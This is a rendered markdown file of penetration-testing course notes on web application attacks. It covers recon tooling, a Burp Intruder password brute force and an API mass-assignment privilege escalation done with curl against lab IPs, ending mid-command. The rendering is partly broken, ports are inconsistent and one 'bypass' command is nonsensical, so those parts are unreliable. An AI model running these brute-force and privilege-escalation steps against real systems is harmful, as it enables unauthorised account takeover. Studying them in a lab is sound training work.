@@ -1,0 +1,1307 @@
+
+    <article class="git-file-panel" data-git-panel-section="blob" data-git-fragment-path="git/cm-blog-content-staging/blob/content/offsec/web-intro.md/index.html" data-git-raw-path="git/cm-blog-content-staging/blob/content/offsec/web-intro.md/raw.txt" data-git-line-count="1295">
+      <header class="git-file-header">
+        <div class="git-file-header-main">
+          <h4 class="git-file-title">web-intro.md</h4>
+          <div class="git-file-meta">67 KB · 1295 lines · content/offsec/web-intro.md</div>
+        </div>
+        <div class="git-file-actions">
+          <a class="git-file-action git-file-action--raw" href="./git/cm-blog-content-staging/blob/content/offsec/web-intro.md/raw.txt" target="_blank" rel="noopener">Raw</a>
+          <button type="button" class="git-file-action git-file-action--copy" data-git-file-copy>Copy</button>
+        </div>
+      </header>
+      <div class="git-file-body" data-git-file-body>
+        <hr>
+<h2>title: PEN-200 Module 8 — Web App Recon to First Exploit
+created: 2023-08-03 15:22:09Z
+updated: 2023-08-07 15:16:28Z</h2>
+<h1>PEN-200 Module 8 — Web App Recon to First Exploit</h1>
+<h2>TLDR;</h2>
+<p>The raw notes for Module 8 document a complete workflow from fingerprinting to attack. This revision folds in those concrete steps so you can repeat the process without flipping pages.</p>
+<h3>Surface Mapping</h3>
+<pre><code># Stack fingerprinting
+nmap -sV --script http-enum -p 80,443 portal.acme.local
+whatweb https://portal.acme.local
+wappalyzer https://portal.acme.local --pretty
+
+# Directory and file discovery
+gobuster dir -u https://portal.acme.local -w wordlists/raft-medium.txt -x php,asp,js,bak -o scans/portal-gobuster.txt
+feroxbuster -u https://portal.acme.local -w wordlists/raft-medium.txt -t 60 -k
+</code></pre>
+<ul>
+<li>Mirror robots.txt and sitemap.xml into your notes; the labs hide juicy endpoints there.</li>
+<li>Capture HTTP response headers (<code>curl -I</code>) and note cookies, security headers, and session attributes.</li>
+</ul>
+<h3>Traffic Instrumentation</h3>
+<ul>
+<li>Set Burp Proxy to intercept login flows and tag requests in Repeater with the vulnerability type you suspect.</li>
+<li>Use Burp’s Target &gt; Site map to group hosts by functionality (auth, API, admin).</li>
+<li>Export raw requests/responses with comments; they drop cleanly into the report later.</li>
+</ul>
+<h3>Enumeration Focus Areas</h3>
+<table>
+<thead>
+<tr>
+<th>Area</th>
+<th>Checks</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Debug content</strong></td>
+<td>View-source for comments, stack traces, build IDs. Take screenshots; they often justify findings.</td>
+</tr>
+<tr>
+<td><strong>Authentication</strong></td>
+<td>Capture password policy hints, MFA prompts, and lockout behaviour. Document status codes and response times.</td>
+</tr>
+<tr>
+<td><strong>APIs</strong></td>
+<td>Use <code>swagger</code> references, GraphQL introspection, or Burp Intruder to fuzz parameters. Note auth tokens and scopes.</td>
+</tr>
+<tr>
+<td><strong>Upload points</strong></td>
+<td>Record allowed MIME types, extension filters, and storage paths.</td>
+</tr>
+</tbody></table>
+<h3>Working Exploit Examples</h3>
+<pre><code># Tamper with parameters via curl
+curl -s -k -b cookies.txt -d &quot;role=user&quot; https://portal.acme.local/profile.php
+
+# Bypass client-side checks
+echo &quot;fetch(&#39;/api/admin/users&#39;,{method:&#39;POST&#39;,body:JSON.stringify({user:&#39;alice&#39;})})&quot; | mitmproxy-ca
+
+# Automate baseline fuzzing
+ffuf -X GET -u https://portal.acme.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,204,301,302
+</code></pre>
+<h3>Documentation Tips</h3>
+<ul>
+<li>For each confirmed issue, store the vulnerable request, the triggering payload, and the remediation guidance (e.g., “normalise path input with <code>realpath()</code>”).</li>
+<li>Record error messages and stack traces—they provide version clues and chain opportunities.</li>
+<li>Maintain a timeline: first contact, credential capture, exploit confirmation. It will anchor the narrative in the Module 24 lab.</li>
+</ul>
+<p>Module 8 becomes muscle memory when you keep this workflow handy—reach for it before every web target, not just in the training environment.</p>
+<h2>Working Notes... In Graphic Detail...</h2>
+<h4>8 Introduction to Web Application Attacks</h4>
+<ul>
+<li><pre><code>Web Application Assessment Methodology.
+</code></pre>
+</li>
+<li><pre><code>Web Application Enumeration.
+</code></pre>
+</li>
+<li><pre><code>Cross-Site Scripting.
+</code></pre>
+</li>
+</ul>
+<h5>8.1 Web Application Assessment Methodology</h5>
+<ul>
+<li><pre><code>Understand web application security testing requirements.
+</code></pre>
+</li>
+<li><pre><code>Learn different types and methodologies of web application testing.
+</code></pre>
+</li>
+<li><pre><code>Learn about the OWASP Top10 and most common web vulnerabilities.
+</code></pre>
+</li>
+</ul>
+<h5>8.2 Web Application Assessment Tools</h5>
+<ul>
+<li><pre><code>Perform common enumeration techniques on web applications.
+</code></pre>
+</li>
+<li><pre><code>Understand Web Proxies theory.
+</code></pre>
+</li>
+<li><pre><code>Learn how Burp Suite proxy works for web application testing.
+</code></pre>
+</li>
+</ul>
+<h6>Fingerprinting Web Servers with Nmap</h6>
+<ul>
+<li>Nmap is the go-to tool for initial active enumeration.</li>
+<li>Start web application enumeration from its core component, the web server.</li>
+<li>This is the common denominator of any web application that exposes its services.</li>
+</ul>
+<p>Since we found port 80 open on our target, we can proceed with service discovery. To get started, we&#39;ll rely on the nmap service scan <code>-sV</code> to grab the web server <code>-p80</code> banner.</p>
+<pre><code class="language-bash">kali@kali:~$ sudo nmap -p80  -sV 192.168.50.20
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 05:13 EDT
+Nmap scan report for 192.168.50.20
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+</code></pre>
+<p>Our scan shows that Apache version 2.4.41 is running on the Ubuntu host.</p>
+<ul>
+<li>Take our enumeration further.</li>
+<li>Use service-specific Nmap NSE scripts, like http-enum, which performs an initial fingerprinting of the web server.</li>
+</ul>
+<pre><code class="language-bash">kali@kali:~$ sudo nmap -p80 --script=http-enum 192.168.50.20
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 06:30 EDT
+Nmap scan report for 192.168.50.20
+Host is up (0.10s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /login.php: Possible admin folder
+|   /db/: BlogWorx Database
+|   /css/: Potentially interesting directory w/ listing on &#39;apache/2.4.41 (ubuntu)&#39;
+|   /db/: Potentially interesting directory w/ listing on &#39;apache/2.4.41 (ubuntu)&#39;
+|   /images/: Potentially interesting directory w/ listing on &#39;apache/2.4.41 (ubuntu)&#39;
+|   /js/: Potentially interesting directory w/ listing on &#39;apache/2.4.41 (ubuntu)&#39;
+|_  /uploads/: Potentially interesting directory w/ listing on &#39;apache/2.4.41 (ubuntu)&#39;
+
+Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
+</code></pre>
+<p>As shown above, we discovered several interesting folders that could lead to further details about the target web application.</p>
+<ul>
+<li>Using Nmap scripts, we managed to discover more application-specific information that we can add to the web server enumeration we performed earlier.</li>
+</ul>
+<h6>Technology Stack Identification with Wappalyzer</h6>
+<ul>
+<li>Along with the active information gathering we performed via Nmap.</li>
+<li>Also passively fetch a wealth of information about the application technology stack via <a href="https://www.wappalyzer.com/">Wappalyzer</a></li>
+<li>registered a free account.<ul>
+<li>perform a Technology Lookup on the megacorpone.com domain.</li>
+</ul>
+</li>
+<li>From this quick third-party external analysis, we learned about.</li>
+<li>OS.</li>
+<li>UI framework.</li>
+<li>web server.</li>
+<li>The findings also provide information about JavaScript libraries used by the web application.
+-  can be valuable data, as some versions of JavaScript libraries are known to be affected by several vulnerabilities.</li>
+</ul>
+<p><img src="../_resources/Screenshot%20from%202023-08-04%2007-30-45.png" alt="Screenshot from 2023-08-04 07-30-45.png"></p>
+<h6>Directory Brute Force with Gobuster</h6>
+<ul>
+<li>Once we have discovered an application running on a web server, next step is to map all its publicly-accessible files and directories.</li>
+<li>Need to perform multiple queries against the target to discover any hidden paths.<ul>
+<li><a href="https://www.kali.org/tools/gobuster/">Gobuster</a></li>
+</ul>
+</li>
+<li>Tool (written in Go language) that can help us with this sort of enumeration.</li>
+<li>Uses wordlists to discover directories and files on a server through <strong>brute forcing</strong>.</li>
+</ul>
+<p><strong>NOTE:</strong> Due to its brute forcing nature, Gobuster can generate quite a lot of traffic, meaning it will not be helpful when staying under the radar is necessary.</p>
+<ul>
+<li>Gobuster supports different enumeration modes.</li>
+<li>Fuzzing.</li>
+<li>Dns.</li>
+<li>Dir mode.</li>
+<li>Which enumerates files and directories.</li>
+</ul>
+<h1>We need to specify the target IP using the -u parameter and a wordlist with -w. The default running threads are 10; we can reduce the amount of traffic by setting a lower number via the -t parameter.
+```bash
+kali@kali:~$ gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5</h1>
+<h1>Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</h1>
+<h1>[+] Url:                     <a href="http://192.168.50.20">http://192.168.50.20</a>
+[+] Method:                  GET
+[+] Threads:                 5
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s</h1>
+<h1>2022/03/30 05:16:21 Starting gobuster in directory enumeration mode</h1>
+<p>/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/css                  (Status: 301) [Size: 312] [--&gt; <a href="http://192.168.50.20/css/%5D">http://192.168.50.20/css/]</a>
+/db                   (Status: 301) [Size: 311] [--&gt; <a href="http://192.168.50.20/db/%5D">http://192.168.50.20/db/]</a>
+/images               (Status: 301) [Size: 315] [--&gt; <a href="http://192.168.50.20/images/%5D">http://192.168.50.20/images/]</a>
+/index.php            (Status: 302) [Size: 0] [--&gt; ./login.php]
+/js                   (Status: 301) [Size: 311] [--&gt; <a href="http://192.168.50.20/js/%5D">http://192.168.50.20/js/]</a>
+/server-status        (Status: 403) [Size: 278]
+/uploads              (Status: 301) [Size: 316] [--&gt; <a href="http://192.168.50.20/uploads/%5D">http://192.168.50.20/uploads/]</a></p>
+<h1>===============================================================
+2022/03/30 05:18:08 Finished</h1>
+<pre><code>Under the `/usr/share/wordlists/dirb/` folder we selected the `common.txt` wordlist, which found ten resources. Four of these resources are inaccessible due to insufficient privileges (Status: 403). However, the remaining six are accessible and deserve further investigation.
+
+###### Security Testing with Burp Suite
+
+[Burp Suite](https://portswigger.net/burp) is a GUI-based integrated platform for web application security testing. It provides several different tools via the same user interface.
+
+- Community Edition mainly contains tools used for manual testing.
+- Commercial versions include additional features.
+ - Including a formidable web application vulnerability scanner.
+- Burp Suite has an extensive feature list and is worth investigating, but we will only explore a few basic functions in this section.
+
+**Interface**
+-  initial four panes of the interface primarily serve as a summary for the Pro version scanner.
+-   Proxy tool.
+ -   In general terms, a web proxy is any dedicated hardware or software meant to intercept requests and/or responses between the web client and the web server. .
+    -   This allows administrators and testers alike to modify any requests that are intercepted by the proxy, both manually and automatically.
+        -   Some web proxies are employed to intercept company-wide TLS traffic. Known as TLS inspection devices, these perform decryption and re-encryption of the traffic and thus nullify any privacy layer provided by the HTTPS protocol.
+    - **Example:** we can intercept any request sent from the browser before it is passed on to the server.
+        - We can change almost anything about the request at this point, such as parameter names or form values.
+        - We can even add new headers.
+  - This lets us test how an application handles unexpected arbitrary input. .
+        - For example, an input field might have a size limit of 20 characters, but we could use Burp Suite to modify a request to submit 30 characters.
+
+**Proxy Tab**
+- Click the Proxy tab to reveal several sub-tabs. We&#39;ll also disable the Intercept tool, found under the Intercept tab.
+    - When Intercept is enabled, we have to manually click on Forward to send each request to its destination. Alternatively, we can click Drop to not send the request. There are times when we will want to intercept traffic and modify it, but when we are just browsing a site, having to click Forward on each request is very tedious.
+- Options sub-tab shows what ports are listening for proxy requests.
+ - Default, Burp Suite enables a proxy listener on localhost:8080.
+- Burp Suite is now shipped with its own Chromium-based native web browser, which is preconfigured to work with all Burp&#39;s features. However, for this course we are going to exclusively rely on Kali&#39;s Firefox browser because it is a more flexible and modular option.
+- In some testing scenarios, we might want to capture the traffic from multiple machines, so the proxy will be configured on a standalone IP. In such cases, we will configure the browser with the external IP address of the proxy.
+- **NOTE:** Why does &quot;detectportal.firefox.com&quot; keep showing up in the proxy history? A captive portal3 is a web page that serves as a sort of gateway page when attempting to browse the Internet. It is often displayed when accepting a user agreement or authenticating through a browser to a Wi-Fi network. To ignore this, simply enter about:config in the address bar. Firefox will present a warning, but we can proceed by clicking I accept the risk!. Finally, search for &quot;network.captive-portal-service.enabled&quot; and double-click it to change the value to &quot;false&quot;. This will prevent these messages from appearing in the proxy history.
+
+**Repeater Tab**
+- We can craft new requests or easily modify the ones in History, resend them, and review the responses.
+- We can right-click a request from Proxy &gt; HTTP History and select Send to Repeater.
+- Click on Repeater, we will observe one sub-tab with the request on the left side of the window.
+ - We can send multiple requests to Repeater and it will display them using separate tabs.
+ - Send the request to the server by clicking Send.
+- Burp Suite will display the raw server response on the right side of the window.
+ - Includes the response headers and un-rendered response content.
+
+**Intruder Tab**
+- Designed to automate a variety of attack angles.
+ - Simplest to more complex web application attacks.
+
+Configure our local Kali&#39;s hosts file to statically assign the IP to the offsecwp website we are going to test.
+```bash
+kali@kali:~$ cat /etc/hosts 
+
+...
+192.168.50.16 offsecwp
+</code></pre>
+<ul>
+<li><strong>Workflow</strong>.</li>
+<li>Start a new Burp session and configure the Proxy as we did before.</li>
+<li>Navigate to <a href="http://offsecwp/wp-login.php">http://offsecwp/wp-login.php</a> from Firefox.</li>
+<li>Type &quot;admin&quot; and &quot;test&quot; as respective username and password values, and click Log in.<ul>
+<li>Returning to Burp, we&#39;ll navigate to Proxy &gt; HTTP History, right-click on the POST request to /wp-login.php and select Send to Intruder.</li>
+</ul>
+</li>
+<li>Select the Intruder tab in the upper bar, choose the POST request we want to modify.</li>
+<li>Move to the Positions sub-tab. Knowing that the user admin is correct, we only need to brute force the password field.</li>
+<li>Press Clear on the right bar so that all fields are cleared.</li>
+<li>Select the value of the pwd key and press the Add button on the right.</li>
+<li>We have now instructed the Intruder to modify only the password value on each new request.</li>
+<li>Provide Intruder with a wordlist. Knowing that the correct password is &quot;password&quot;, we can grab the first 10 values from the rockyou wordlist on Kali.</li>
+</ul>
+<pre><code class="language-bash">kali@kali:~$ cat /usr/share/wordlists/rockyou.txt | head
+123456
+12345
+123456789
+password
+iloveyou
+princess
+1234567
+rockyou
+12345678
+abc123
+</code></pre>
+<ul>
+<li>Moving to the Payloads sub-tab, we can paste the above wordlist into the Payload Options <code>Simple list</code> area.</li>
+<li>Click on the top right Start Attack button.</li>
+<li>Move past the Burp warning about restricted Intruder features, as this won&#39;t impact our attack.</li>
+<li>After we let the attack complete, we can observe that apart from the initial probing request, it performed 10 requests, one for each entry in the provided wordlist.</li>
+<li>Notice that the WordPress application replied with a different Status code on the 4th request.</li>
+<li>Hinting that this might be the correct password value.</li>
+</ul>
+<h5>8.3 Web Application Enumeration</h5>
+<ul>
+<li><pre><code>Learn how to debug Web Application source code.
+</code></pre>
+</li>
+<li><pre><code>Understand how to enumerate and inspect Headers, Cookies, and Source Code.
+</code></pre>
+</li>
+<li><pre><code>Learn how to conduct API testing methodologies.
+</code></pre>
+</li>
+</ul>
+<p>It is important to identify the components that make up a web application before attempting to blindly exploit it. Many web application vulnerabilities are technology-agnostic. However, some exploits and payloads need to be crafted based on the technological underpinnings of the application, such as the database software or operating system. Before launching any attacks on a web application, we should first attempt to discover the technology stack in use. Technology stacks generally consist of a host operating system, web server software, database software, and a frontend/backend programming language.</p>
+<p>We can leverage several techniques to gather this information directly from the browser. Most modern browsers include developer tools that can assist in the enumeration process.</p>
+<ul>
+<li>As the name implies, although Developer Tools are typically used by developers, they are useful for our purposes because they offer information about the inner workings of our target application.</li>
+</ul>
+<h6>Debugging Page Content</h6>
+<ul>
+<li><p>A good place to start our web application information mapping is with a URL address.</p>
+</li>
+<li><p>File extensions, which are sometimes part of a URL, can reveal the programming language the application was written in.</p>
+</li>
+<li><p>Extensions, like .php, are straightforward.</p>
+</li>
+<li><p>Others are more cryptic and vary based on the frameworks in use.</p>
+</li>
+<li><p>Example, a Java-based web application might use .jsp, .do, or .html.</p>
+</li>
+<li><p>Many languages and frameworks now support the concept of routes.</p>
+</li>
+<li><p>Allow developers to map a URI to a section of code.</p>
+</li>
+<li><p>Apps leveraging routes use logic to determine what content is returned to the user.</p>
+</li>
+<li><p>Making URI extensions largely irrelevant.</p>
+</li>
+<li><p>URL inspection can provide some clues about the target web application, most context clues can be found in the source of the web page.</p>
+</li>
+<li><p>Firefox Debugger tool (found in the Web Developer menu) displays the page&#39;s resources and content.</p>
+<ul>
+<li>Debugger tool may display JavaScript frameworks, hidden input fields, comments, client-side controls within HTML, JavaScript, and more.</li>
+</ul>
+</li>
+<li><p><strong>Workflow</strong>.</p>
+</li>
+<li><p>Debugger while browsing the <code>offsecwp</code> app.</p>
+</li>
+<li><p>We&#39;ll notice that the application uses jQuery2 version 3.6.0.</p>
+</li>
+<li><p>A common JavaScript library. In this case.</p>
+</li>
+<li><p>The developer minified3 the code.</p>
+</li>
+<li><p>Making it more compact and conserving resources.</p>
+</li>
+<li><p>Also makes it somewhat difficult to read.</p>
+</li>
+<li><p>We can &quot;prettify&quot; code within Firefox by <strong>clicking on the Pretty print source button with the double curly braces</strong>.
+- After clicking the icon, Firefox will display the code in a format that is easier to read.</p>
+</li>
+<li><p>Use the Inspector tool to drill down into specific page content.</p>
+</li>
+<li><p>Examine the search input element from the WordPress home page by scrolling, right-clicking the search field on the page, and selecting Inspect.</p>
+</li>
+<li><p>This will open the Inspector tool and highlight the HTML for the element we right-clicked on.</p>
+</li>
+<li><p>Can be especially useful for quickly finding hidden form fields in the HTML source.</p>
+</li>
+</ul>
+<h6>Inspecting HTTP Response Headers and Sitemaps</h6>
+<ul>
+<li>We can also search server responses for additional information.</li>
+<li>Two types of tools we can use to accomplish this task.</li>
+<li>First type is a proxy, like Burp Suite, which intercepts requests and responses between a client and a web server.</li>
+<li>The second type is the browser&#39;s own Network tool.</li>
+<li>Firefox Web Developer menu to review HTTP requests and responses.</li>
+<li>Tool shows network activity that occurs after it launches.</li>
+<li>We must refresh the page to display.</li>
+<li>Click on a request to get more details.</li>
+<li>Server header displayed above will often reveal at least the name of the web server software.</li>
+<li>In many default configurations, it also reveals the version number.
+   - <strong>Note:</strong> HTTP headers are not always generated solely by the web server. For instance, web proxies actively insert the X-Forwarded-For2 header to signal the web server about the original client IP address.</li>
+<li><strong>Non-standard HTTP headers</strong>.</li>
+<li>Headers that started with &quot;X-&quot;.<ul>
+<li><a href="https://www.rfc-editor.org/rfc/rfc6648">RFC6648</a></li>
+</ul>
+</li>
+<li>Now deprecates the use of &quot;X-&quot; in favor of a clearer naming convention.</li>
+<li>Names or values in the response header often reveal additional information about the technology stack used by the application.</li>
+<li>X-Powered-By.</li>
+<li>X-amz-cf-id.</li>
+<li>Indicates the application uses Amazon CloudFront.</li>
+<li>X-Aspnet-Version.</li>
+<li><strong>Sitemaps</strong>.</li>
+<li>Web applications can include sitemap files to help search engine bots crawl and index their sites.</li>
+<li>Also include directives of which URLs not to crawl - typically sensitive pages or administrative consoles.</li>
+<li>Exactly the sort of pages we are interested in.<ul>
+<li>Inclusive directives are performed with the <a href="https://www.sitemaps.org/">sitemaps protocol</a></li>
+</ul>
+</li>
+<li><code>robots.txt</code> excludes URLs from being crawled.</li>
+<li>Allow and Disallow are directives for web crawlers indicating pages or directories that &quot;polite&quot; web crawlers may or may not access.</li>
+<li>Most cases, the listed pages and directories may not be interesting, and some may even be invalid.</li>
+<li>Sitemap files should not be overlooked because they may contain clues about the website layout or other interesting information, such as yet-unexplored portions of the target.</li>
+</ul>
+<p><strong>Example:</strong>  we can retrieve the robots.txt file from <a href="http://www.google.com">www.google.com</a> with curl:</p>
+<pre><code class="language-bash">kali@kali:~$ curl https://www.google.com/robots.txt
+User-agent: *
+Disallow: /search
+Allow: /search/about
+Allow: /search/static
+Allow: /search/howsearchworks
+Disallow: /sdch
+Disallow: /groups
+Disallow: /index.html?
+Disallow: /?
+Allow: /?hl=
+</code></pre>
+<h6>Enumerating and Abusing APIs</h6>
+<ul>
+<li>In many cases, our penetration test target is an internally-built.</li>
+<li>Closed-source web application.</li>
+<li>Shipped with a number of Application Programming Interfaces (API)</li>
+<li>APIs are responsible for interacting with the back-end logic and providing a solid backbone of functions to the web application.</li>
+<li>typical white-box test scenario.</li>
+<li>we would receive complete API documentation to help us fully map the attack surface.</li>
+<li>black-box test.</li>
+<li>we&#39;ll need to discover the target&#39;s API ourselves.</li>
+<li>can use <strong>Gobuster</strong> features to brute force the API endpoints.</li>
+<li>test scenario, our API gateway web server is listening on port 5001 on 192.168.50.16, so we can attempt a directory brute force attack.</li>
+<li>API paths are often followed by a version number.<ul>
+<li><code>/api_name/v1</code></li>
+</ul>
+</li>
+</ul>
+<p>Brute forcing the API paths using a wordlist along with the pattern Gobuster feature. We can call this feature by using the -p option and providing a file with patterns. For our test, we&#39;ll create a simple pattern file on our Kali system containing the following text:</p>
+<pre><code>{GOBUSTER}/v1
+{GOBUSTER}/v2
+</code></pre>
+<p>we are using the &quot;{GOBUSTER}&quot; placeholder to match any word from our wordlist, which will be appended with the version number.</p>
+<h1>Enumerate the API with gobuster using the following command:
+```bash
+kali@kali:~$ gobuster dir -u <a href="http://192.168.50.16:5002">http://192.168.50.16:5002</a> -w /usr/share/wordlists/dirb/big.txt -p pattern</h1>
+<h1>Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</h1>
+<h1>[+] Url:                     <a href="http://192.168.50.16:5001">http://192.168.50.16:5001</a>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Patterns:                pattern (1 entries)
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s</h1>
+<h1>2022/04/06 04:19:46 Starting gobuster in directory enumeration mode</h1>
+<p>/books/v1             (Status: 200) [Size: 235]
+/console              (Status: 200) [Size: 1985]
+/ui                   (Status: 308) [Size: 265] [--&gt; <a href="http://192.168.50.16:5001/ui/%5D">http://192.168.50.16:5001/ui/]</a>
+/users/v1             (Status: 200) [Size: 241]</p>
+<pre><code>We discovered multiple hits, including two interesting entries that seem to be API endpoints, /books/v1 and /users/v1.
+- If we browse to the /ui path we&#39;ll discover the entire APIs&#39; documentation. Although this is common during white-box testing, is not a luxury we normally have during a black-box test.
+
+inspect the /users API with curl.
+```bash
+kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 241
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Wed, 06 Apr 2022 09:27:50 GMT
+
+{
+  &quot;users&quot;: [
+    {
+      &quot;email&quot;: &quot;mail1@mail.com&quot;,
+      &quot;username&quot;: &quot;name1&quot;
+    },
+    {
+      &quot;email&quot;: &quot;mail2@mail.com&quot;,
+      &quot;username&quot;: &quot;name2&quot;
+    },
+    {
+      &quot;email&quot;: &quot;admin@mail.com&quot;,
+      &quot;username&quot;: &quot;admin&quot;
+    }
+  ]
+}
+</code></pre>
+<p>The application returned three user accounts, including an administrative account that seems to be worth further investigation. We can use this information to attempt another brute force attack with gobuster, this time targeting the admin user with a smaller wordlist. </p>
+<h1>To verify if any further API property is related to the username property, we&#39;ll expand the API path by inserting the admin username at the very end.
+```bash
+kali@kali:~$ gobuster dir -u <a href="http://192.168.50.16:5002/users/v1/admin/">http://192.168.50.16:5002/users/v1/admin/</a> -w /usr/share/wordlists/dirb/small.txt</h1>
+<h1>Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</h1>
+<h1>[+] Url:                     <a href="http://192.168.50.16:5001/users/v1/admin/">http://192.168.50.16:5001/users/v1/admin/</a>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s</h1>
+<h1>2022/04/06 06:40:12 Starting gobuster in directory enumeration mode</h1>
+<p>/email                (Status: 405) [Size: 142]
+/password             (Status: 405) [Size: 142]</p>
+<h1>===============================================================
+2022/04/06 06:40:35 Finished</h1>
+<pre><code>
+The password API path seems enticing for our testing purposes, so we&#39;ll probe it via curl.
+```bash
+kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
+HTTP/1.0 405 METHOD NOT ALLOWED
+Content-Type: application/problem+json
+Content-Length: 142
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Wed, 06 Apr 2022 10:58:51 GMT
+
+{
+  &quot;detail&quot;: &quot;The method is not allowed for the requested URL.&quot;,
+  &quot;status&quot;: 405,
+  &quot;title&quot;: &quot;Method Not Allowed&quot;,
+  &quot;type&quot;: &quot;about:blank&quot;
+}
+</code></pre>
+<p>Interestingly, instead of a 404 Not Found response code, we received a 405 METHOD NOT ALLOWED, implying that the requested URL is present, but that our HTTP method is unsupported. By default, curl uses the GET method when it performs requests, so we could try interacting with the password API through a different method, such as POST or PUT.</p>
+<p>Both POST and PUT methods, if permitted on this specific API, could allow us to override the user credentials (in this case, the administrator password).</p>
+<p>Before attempting a different method, let&#39;s verify whether or not the overwritten credentials are accepted. We can check if the login method is supported by extending our base URL as follows:</p>
+<pre><code class="language-bash">kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
+HTTP/1.0 404 NOT FOUND
+Content-Type: application/json
+Content-Length: 48
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Wed, 06 Apr 2022 12:04:30 GMT
+
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;User not found&quot;}
+</code></pre>
+<ul>
+<li>404 NOT FOUND message.</li>
+<li>Status message states that the user has not been found.</li>
+<li>Another clear sign that the API itself exists.</li>
+<li>We only need to find a proper way to interact with it.</li>
+</ul>
+<p><strong>Exploiting a logical privilege escalation bug present in the registration API</strong></p>
+<ul>
+<li>We know one of the usernames is admin.</li>
+<li>We can attempt a login with this username and a dummy password to verify that our strategy makes sense.</li>
+<li>Next, we will try to convert the above GET request into a POST and provide our payload in the required JSON format.</li>
+<li>Craft request by first passing the admin username and dummy password as JSON data via the <code>-d</code> parameter.</li>
+<li>Also specify &quot;json&quot; as the &quot;Content-Type&quot; by specifying a new header with <code>-H</code>.</li>
+</ul>
+<pre><code class="language-bash">kali@kali:~$ curl -d &#39;{&quot;password&quot;:&quot;fake&quot;,&quot;username&quot;:&quot;admin&quot;}&#39; -H &#39;Content-Type: application/json&#39;  http://192.168.50.16:5002/users/v1/login
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Password is not correct for the given username.&quot;}
+</code></pre>
+<p><strong>NOTE:</strong> API return message shows that the authentication failed, meaning that the API parameters are correctly formed</p>
+<ul>
+<li>Try another route and check whether we can register as a new user.</li>
+<li>Try registering a new user with the following syntax by adding a JSON data structure that specifies the desired username and password.</li>
+</ul>
+<pre><code class="language-bash">kali@kali:~$curl -d &#39;{&quot;password&quot;:&quot;lab&quot;,&quot;username&quot;:&quot;offsecadmin&quot;}&#39; -H &#39;Content-Type: application/json&#39;  http://192.168.50.16:5002/users/v1/register
+
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;&#39;email&#39; is a required property&quot;}
+</code></pre>
+<ul>
+<li>API replied with a fail message stating that we should also include an email address.</li>
+<li>Take this opportunity to determine if there&#39;s any <strong>administrative key</strong> we can abuse.</li>
+<li>Add the admin key, followed by a <code>True</code> value.</li>
+</ul>
+<pre><code class="language-bash">kali@kali:~$curl -d &#39;{&quot;password&quot;:&quot;lab&quot;,&quot;username&quot;:&quot;offsec&quot;,&quot;email&quot;:&quot;pwn@offsec.com&quot;,&quot;admin&quot;:&quot;True&quot;}&#39; -H &#39;Content-Type: application/json&#39; http://192.168.50.16:5002/users/v1/register
+{&quot;message&quot;: &quot;Successfully registered. Login to receive an auth token.&quot;, &quot;status&quot;: &quot;success&quot;}
+</code></pre>
+<ul>
+<li>We received no error, it seems we were able to successfully register a new user as an admin.</li>
+<li>Should not be permitted by design.</li>
+<li>Try to log in with the credentials we just created by invoking the login API we discovered earlier.</li>
+</ul>
+<pre><code class="language-bash">kali@kali:~$curl -d &#39;{&quot;password&quot;:&quot;lab&quot;,&quot;username&quot;:&quot;offsec&quot;}&#39; -H &#39;Content-Type: application/json&#39;  http://192.168.50.16:5002/users/v1/login
+{&quot;auth_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew&quot;, &quot;message&quot;: &quot;Successfully logged in.&quot;, &quot;status&quot;: &quot;success&quot;}
+</code></pre>
+<ul>
+<li>We were able to correctly sign in and retrieve a JWT authentication token.</li>
+<li>To obtain tangible proof that we are an administrative user.</li>
+<li>We should use this token to change the admin user password.</li>
+<li>We can attempt this by forging a POST request that targets the password API.</li>
+</ul>
+<pre><code class="language-bash">kali@kali:~$ curl  \
+  &#39;http://192.168.50.16:5002/users/v1/admin/password&#39; \
+  -H &#39;Content-Type: application/json&#39; \
